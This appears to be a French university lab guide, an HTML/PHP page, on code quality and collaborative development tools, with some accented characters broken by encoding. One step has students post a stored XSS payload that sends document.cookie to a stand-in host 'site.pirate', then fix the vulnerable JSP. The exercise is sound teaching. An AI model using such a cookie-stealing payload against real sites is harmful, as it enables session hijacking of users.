<html>
<head>
<title>Travaux pratiques - Qualit� de code et bonnes pratiques de d�veloppement</title>
<!--
Remplacer le pattern <ip_config> par l'adresse IP du serveur.

-->
<style>
body{
	background-color: white;
	margin:40px;	
	font-family: Arial;
	font-size:13px;
}

a{
	color:rgb(59,160,59);
	text-decoration: none;
	font-family: Arial;
}

h1{
	font-family: Arial;
	color:rgb(59,160,59);
	border-bottom: solid 1px rgb(59,160,59);
	width:60%;
	font-size:18px;
}


h2{
color:rgb(100,100,100);
margin-left:20px;
width:60%;
	border-bottom: solid 1px rgb(59,160,59);
}

h3{
color:rgb(70,70,70);
margin-left:30px;
width:50%;
	border-bottom: solid 1px rgb(59,160,59);
}

h4{
color:rgb(70,70,70);
margin-left:40px;
font-style:italic;
}

p.contexte{
margin-left:30px;
font-size:11px;
}

p.instructions, p.introduction, ul, li{
margin-left:30px;
}

p.instructions{
margin-bottom:10px;
}

.note{
background-color:rgb(200,200,200);
font-family:Arial;
color:rgb(126,0,0);
border: solid 1px rgb(59,160,59);
margin-left:10%;
margin-right:10%;
padding:15px;
}

span.questions{
	color:blue;
	margin-bottom:10px;
	border-bottom: solid 1px rgb(59,160,59);
	font-style:italic;
}

.command{
font-family:Courier New;
color:green;
margin-left:5px;
margin-right:5px;
}
</style>

</head>
<body>
<?php
$group_port=getenv('GPORT');
$darray = explode(':', $_SERVER['HTTP_HOST']);
$host=$darray[0];
$apache_url="http://" . $host . ":" . $group_port . "80/";
$jenkins_url="http://" . $host . ":" . $group_port . "81/";
$sonar_url="http://" . $host . ":" . $group_port . "82/";
echo "<BR/>Host=" . $host;
echo "<BR/>Group Port=" . $group_port;
echo "<BR/>Apache Url=" . $apache_url;
echo "<BR/>Jenkins Url=" . $jenkins_url;
echo "<BR/>Sonar Url=" . $sonar_url;
?>

<h1>Travaux pratiques - Qualit� de code et bonnes pratiques de d�veloppement</h1>
<h2>Pr�sentation de ce TP</h2>
<p class="introduction">
Lors de votre int�gration prochaine dans une entreprise, vous allez �tre amen�s � travailler sur des projets de tailles diverses. 
<br />
Vous aurez � travailler en collaboration avec d'autres d�veloppeurs dans des �quipes plus ou moins h�t�rog�nes (multi-site, multi-culturelles), partager vos modifications, et vous assurer que la qualit� de l'application reste ma�tris�e.
</p>
<p class="introduction">
L'objectif de ce TP est de vous familiariser avec les diff�rents concepts et outils utilis�s pour le travail collaboratif. Vous utiliserez tour � tour un outil de :
<ul>
<li>D�veloppement (Eclipse),</li>
<li>Gestion de configuration (Git),</li>
<li>Gestion de cycle de vie de l'application (Maven),</li>
<li>Analyse du code source (Checkstyle),</li>
<li>Tests des performances (JMeter),</li>
<li>Tests de l'interface graphique (Selenium),</li>
<li>Int�gration continue (Jenkins et Sonar).</li>
</ul>
</p>
<p class="introduction">
Ce guide vous guidera tout au long du TP pour vous montrer les actions � r�aliser, mais il vous faudra faire preuve d'abstraction et de bon sens pour aller au-del� des exemples.
</p>
<p class="introduction">
Dans tous les cas, votre moteur de recherche pr�f�r� et moi-m�me restons vos meilleurs atouts durant tout ce TP.
</p>

<h2>Pr�requis</h2>
<ul>
<li>Un JDK >= 1.6 doit �tre install� sur votre poste de travail et la variable d'environnement $JAVA_HOME doit �tre correctement configur�e</li>
<li>Apache Maven 3.x doit �tre install� sur votre poste de travail et la variable d'environnement $M3_HOME doit �tre correctement configur�e</li>
</ul>
<h2>Etape 1 - Utiliser le projet</h2>

<h3>Installer les outils de d�veloppement</h3>
<h4>Eclipse</h4>
<p class="instructions">
T�l�chargez Eclipse pour windows pour mac</a> contenant Eclipse et un certain nombre de plugins n�cessaires pour la suite : m2eclipse, Checkstyle, EGit, Run-Jetty-Run.
<br />
D�zipper le package, et ex�cutez le fichier eclipse.exe qu'il contient.
</p>

<h3>Pr�parer le projet</h3>
<h4>Configurer l'acc�s ssh � votre gestionnaire de configuration Git dans Eclipse</h4>
<p class="instructions">
<ul>
<li>R�cup�rer la clef priv�e de votre groupe et d�posez l� dans un r�pertoire s�curis� sur votre poste de d�veloppement (i.e. C:\Users\[nom user]\.ssh)</li>
<li>Ajouter la clef priv�e dans Eclipse via le menu Preferences => Network Connections => SSH2 => Add private key 
<p>
<img alt="" src="images/SSH_key1.PNG"> 
<p/>
</li>
</ul>
</p>

<h4>Importer le projet dans le workspace Eclipse</h4>
<p class="instructions">
R�cup�rer le projet depuis le repository Git de votre groupe :
<ul>
<li>Ouvrir la perpective Git</li>
<li>Cliquez sur "Clone a repository"</li>
<li>Dans la fenetre, rentrer les param�tres URI avec la valeur : ssh://root@<?=$host?>:<?=$group_port?>22/source-code-practice-course
<p>
<img alt="" src="images/Git1.PNG"> 
<p/>
</li>
<li>Dans la fenetre suivante, selectionner la branche "work"
<p>
<img alt="" src="images/Git2.PNG"> 
<p/>
</li>
</ul>

<br />
Importer le projet dans votre Workspace via les menus suivants
<ul>
<li>Import</li>
<li>Git</li>
<li>Projects from Git</li>
<li>Existing Local repository</li>
<li>source-code-practice-course</li>
<li>Import as general project</li>
</ul>
</p>
<p class="instructions">
Essayez de compiler le projet. <span class="questions">Que constatez-vous ?</span>
</p>
<p class="instructions">
Transformez votre projet en projet Maven gr�ce au plugin Maven d'Eclipse : utiliser la commande <span class="command">Configure->Convert to Maven Project</span> du menu contextuel du projet. 
<br />
Regardez la console Maven. <span class="questions">Que se passe-t-il ?</span>
<div class="note">
Si le projet ne compile toujours pas ou si vos settings Maven existants ne permettent pas de r�cup�rer correctement les d�pendances, param�trez votre projet grace au plugin Eclipse de Maven (en sp�cifiant �ventuellement des settings.xml sp�cifiques gr�ce aux param�tres --settings et --global-settings)
<p>
<img alt="" src="images/Mvn_Eclipse.PNG"> 
</p>
</div>

</p>
<p class="instructions">
<span class="questions">Faites des commentaires sur le projet : architecture, structure du code...</span>
</p>

<h3>Tester le projet</h3>
<p class="instructions">
En activant le plugin Maven sur le projet, deux dossiers ont �t� ajout�s au build path. <span class="questions">Quels sont-ils ?</span>
</p>
<p class="instructions">
Ces classes contiennent des tests unitaires, ex�cutez-les dans Eclipse.
<p>
<img alt="" src="images/Test1.PNG"> 
</p>
</p>
<p class="instructions">
Lancez la commande <span class="command">Maven Install</span> dans le menu <span class="command">Run As</span> de votre projet. Regardez le contenu du dossier target de votre projet. <span class="questions">Que contient-il ? D'o� viennent tous ces fichiers, et � quoi servent-ils ? (Inutile de les lister un par un, donnez juste un aper�u.)</span>
</p>

<h3>Ex�cuter le projet sur un serveur</h3>
<p class="instructions">
Ex�cutez votre projet sur le serveur Jetty embarqu� dans le plugin Run-Jetty-Run.
<p>
<img alt="" src="images/Run_Jetty1.PNG">
</p>

<br />
Ouvrez le lien <a href="http://localhost:8080/forum">http://localhost:8080/forum</a> pour utiliser l'application et voir comment elle fonctionne : cr�ez vous un compte, connectez-vous...
<br />
<br />
Relancer l'application en mode debug afin de comprendre le syst�me de traitement par couches mis en oeuvre. <span class="questions">Combien identifiez-vous de couches logicielles dans le programme ? Quelles sont d'apres vous les avantages / inconv�nients d'une telle conceptaion ?</span> 
<br />
<br />
Des donn�es sont d�j� pr�sentes dans la base de donn�es. <span class="questions">A quel moment sont-elles charg�es ? Fouillez le projet dans Eclipse pour trouver comment cela est fait.</span>
</p>

<h2>Etape 2 - V�rifier la qualit� et partager les modifications</h2>

<h3>Analyser la qualit� et le respect des conventions de codage</h3>
<p class="instructions">
Activez le plugin Checkstyle sur le projet.
<img alt="" src="images/CheckStyle1.png">
<br />
Si les erreurs ne sont pas affich�s, ex�cuter la commande <span class="command">Check code with Checkstyle</span> dans le menu <span class="command">Checkstyle</span>.
</p>
<p class="instructions">
Regarder la liste des infractions et corrigez-en quelques-unes (les plus simples suffiront). V�rifiez vos corrections.
</p>
<p class="instructions">
Modifiez la configuration Checkstyle :
<ul>
<li>Autoriser des longueurs de lignes � 120 caract�res,</li>
<li>Activez la v�rification de complexit� cyclomatique avec un maximum de 8.</li>
</ul>
</p>

<h3>Attaquer l'application</h3>
<p class="instructions">
Connectez-vous sur l'application et cr�ez le message suivant sur un sujet : 
<span class="command">&lt;script type="text/javascript">document.location='http://site.pirate/sessionhijacking?'+document.cookie&lt;/script></span>
<br />
<span class="questions">Constatez le probl�me et le risque encouru. Quelle peut �tre la cause du probl�me ?</span>
<br />
<br />
Regardez le code de la JSP <span class="command">src/main/webapp/view/topic/view.jsp</span> � la ligne 60. 
<br />
<span class="questions">Quelle critique pouvez-vous faire ces instructions ? Corrigez-le probl�me, red�marrez le serveur et r�it�rez l'attaque pour v�rifier que cette faille est r�solue.
<br />
Une fois que vous vous �tes assur�(e) que cela est fix�, livrez votre modification sur le repository Git.</span>
</p>

<p class="instructions">
Regardez la console de votre serveur et observez les traces SQL. <span class="questions">Quelle est leur particularit� ? Qu'indiquent-elles et quel en est l'objectif ?</span>
</p>

<h2>Etape 3 - Automatiser les tests</h2>

<h3>V�rifier les performances avec JMeter</h3>
<p class="instructions">
T�l�chargez <a href="http://jmeter.apache.org/download_jmeter.cgi">JMeter</a> et d�zippez-le.
<br />
A partir du dossier bin ainsi d�zipp�, lancez la commande jmeter.bat ou jmeter.sh en fonction de votre syst�me d'exploitation. (Attention, pour les syst�mes � base Unix, il peut �tre n�cessaire d'ajouter le droit d'ex�cution sur le fichier avant de le lancer : <span class="command">chmod +x *.sh</span>)
</p>
<p class="instructions">
A partir du fichier <a href="<?=$apache_url?>/documents/ScenarioJMeter.docx">document</a>, enregistrez le sc�nario suivant sur l'application forum :
<ul>
<li>Ouvrez la page d'accueil,</li>
<li>Connectez-vous avec un mot de passe ou un login erron�,</li>
<li>Connectez-vous avec un compte valide,</li>
<li>Ouvrez le premier sujet pour voir ses mesages, (ici copiez l'URL depuis la barre d'adresse)</li>
<li>D�connectez-vous,</li>
<li>Ouverture de la page avec l'URL copi�e pr�c�demment (la coller dans la barre d'adresse).</li>
</ul>
</p>
<p class="instructions">
Retirez les �ventuelles requ�tes non attendues.
</p>
<p class="instructions">
Configurez le sc�nario pour une ex�cution avec 50 unit�s, sur 10 secondes avec une seule it�ration.
<br />
Ex�cutez le sc�nario dans cette configuration.
</p>
<p class="instructions">
Ajoutez des assertions pour valider le test (Texte dans le contenu)...
<br />
Ex�cutez le sc�nario dans cette nouvelle configuration (n'oubliez pas de (re)cr�er un "arbre de r�sultats" pour voir les r�sultats des assertions).
</p>
<p class="instructions">
Enregistrez le plan de test dans un fichier nomm� "PlanDeTestComplet.jmx".
</p>
<p class="instructions">
Modifiez l�g�rement les valeurs des unit�s et dur�e de mont�e en charge. <span class="questions">Que constatez-vous sur les r�sultats des assertions ?</span>
</p>

<p class="instructions">
Dans votre fichier pom.xml, d�commentez les lignes � partir du commentaire <span class="command">"Activez le plugin JMeter � partir d'ici"</span> jusqu'au commentaire commentaire <span class="command">"Fin de l'activation du plugin JMeter"</span>. Le fichier du sc�nario est d�j� inclu dans votre projet dans <span class="command">test/jmeter</span>.
<br />
Lancez le lifecycle <span class="command">integration-test</span> sur votre projet.
<br /><br />
Regardez ensuite le rapport HTML dans le dossier <span class="command">target/jmeter/report</span>.
</p>

<h3>Tester la UI (User Interface) avec Selenium</h3>
<p class="instructions">
Installez le <a class="tools" href="http://release.seleniumhq.org/selenium-ide/2.5.0/selenium-ide-2.5.0.xpi">plugin Selenium</a>.
<br />
Enregistrez le m�me sc�nario que pour JMeter, ajoutez des assertions dans votre sc�nario et ex�cutez-le au ralenti.
</p>

<h2>Etape 4 - Int�gration continue</h2>

<h3>D�clarer le projet dans Jenkins</h3>
<p class="instructions">
Commitez l'ensemble de vos modifications (git commit -m "Commentaire de commit") puis pousser (git push) les vers votre repository distant.
<br />
Connectez-vous � votre environnement Jenkins <a href="<?=$jenkins_url?>" />
<br />
Activez dans jenkins le plugin git
<br />
D�clarez un nouveau job
<br />
Ex�cutez un build avec la configuration actuelle et inspectez les r�sultats. <span class="question">D�crire ce qui est ex�cut� ?</span>
</p>

<h3>Mesurer continuellement la qualit�</h3>
<p class="instructions">
Activez les plugins suivants :
<ul>
<li>Static Code Analysis,</li>
<li>Checkstyle,</li>
<li>FindBugs,</li>
<li>PMD,</li>
<li>Sonar (<a href="http://docs.codehaus.org/display/SONAR/Activate+Sonar+on+Jenkins+job">Voir la documentation sur le plugin</a>)</li>
</ul>
</p>
<p class="instructions">
Lancez un build, regardez les r�sultats dans Jenkins, que pouvez-vous observer ?
<br />
Acc�dez � <a href="/sonar" class="tools" target="_blank">Sonar</a> et recherchez votre projet. Parcourez les r�sultats.
</p>

<p class="instructions">
A partir de la documentation accessible sur Internet, activez dans votre fichier POM les plugins suivants pour que le serveur de build puisse en afficher les r�sultats :
<ul>
<li>PMD (<a href="https://wiki.jenkins-ci.org/display/JENKINS/PMD+Plugin">Documentation</a>)</li>
<li>Findbugs (<a href="https://wiki.jenkins-ci.org/display/JENKINS/Findbugs+Plugin">Documentation</a>)</li>
</ul>
</p>


<h3>Tester la couverture de code</h3>
<p class="instructions">
A partir de la documentation sur <a href="https://wiki.jenkins-ci.org/display/JENKINS/Emma+Plugin">le plugin d'EMMA pour Jenkins</a>, ajoutez la mesure de la couverture de code � votre build.
<p>

<h3>Tester continuellement les performances</h3>
<p class="instructions">
Activez le plugin Performance (JMeter) sur votre projet et lancez une build.
</p>
<br />
<br />
</body>
</html>